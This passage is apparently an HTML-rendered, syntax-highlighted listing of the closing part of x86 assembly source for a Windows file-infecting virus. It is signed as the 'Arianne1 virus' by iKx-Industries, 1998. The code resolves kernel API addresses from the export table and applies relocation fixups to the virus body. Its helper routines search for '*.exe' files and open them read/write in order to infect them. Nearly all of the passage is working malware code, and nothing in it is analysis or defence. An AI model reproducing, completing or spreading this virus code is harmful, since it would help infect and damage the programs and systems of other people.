    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">36</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; table RVA</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">             </span><span class="sc1">; Add Rva</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">             </span><span class="sc1">; set ebx to 0</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">28</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">             </span><span class="sc1">; eax = the asked rva</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc5">badpoint</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">makefixup</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">             </span><span class="sc1">; get new delta offset</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">relocbuff</span><span class="sc0">        </span><span class="sc1">; eax point to the virus</span><span class="sc0">
    
</span><span class="sc5">bouclemylife</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; get reloc offset item</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">finishapply</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">; then get offset where patchin</span><span class="sc0">
    
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">     </span><span class="sc1">; apply patch</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">bouclemylife</span><span class="sc0">            </span><span class="sc1">; do next</span><span class="sc0">
    
</span><span class="sc5">finishapply</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">ret</span><span class="sc0">                 </span><span class="sc1">; that's finish</span><span class="sc0">


</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   Functions often called , revised by me to be more easy to call from</span><span class="sc0">
</span><span class="sc1">;   an infection process</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">Divit</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">FindFirst</span><span class="sc4">:</span><span class="sc0">


</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">File_Data</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Exe_File</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FindFirstFile</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Handle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">FindNext</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">File_Data</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Handle</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FindNextFile</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Open_file</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc2">080h</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">80000000h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">40000000h</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">File_Data</span><span class="sc4">+</span><span class="sc2">02ch</span><span class="sc0">

</span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CreateFile</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CurrentHandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Close_file</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CurrentHandle</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Close</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Write_file</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Write</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Action_file</span><span class="sc0">

</span><span class="sc5">Read_file</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Read</span><span class="sc0">

</span><span class="sc5">Action_file</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Iobytes</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CurrentHandle</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Seek_file</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CurrentHandle</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SeekFile</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Apilist</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc1">; the list of api we have to</span><span class="sc0">

</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'FindFirstFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">; found in the kernel in </span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'FindNextFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; memory</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'CreateFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'_lclose'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'WriteFile'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'ReadFile'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'SetFilePointer'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">trademark</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">' Arianne1 virus - 06/98 -iKx-Industries'</span><span class="sc0">

</span><span class="sc5">InputToHost</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'.t00fic'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Exe_File</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'*.exe'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">relocbuff</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">05Ch</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">  </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">Hardcoded</span><span class="sc4">:</span><span class="sc0">  

</span><span class="sc5">FindFirstFile</span><span class="sc4">:</span><span class="sc0">  
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">    
</span><span class="sc5">FindNextFile</span><span class="sc4">:</span><span class="sc0">   
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">CreateFile</span><span class="sc4">:</span><span class="sc0"> 
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Close</span><span class="sc4">:</span><span class="sc0">      
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Write</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Read</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">SeekFile</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">pseudofin</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">Handle</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">CurrentHandle</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Iobytes</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">File_Data</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">2ch</span><span class="sc4">+</span><span class="sc2">13</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">ReadyForHost</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0F8h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">TableHost</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">4096</span><span class="sc4">/</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">fin</span><span class="sc4">:</span><span class="sc0">    

</span><span class="sc5">finboom</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc9">ends</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">HOST</span><span class="sc0">
</span></div></body>
</html>
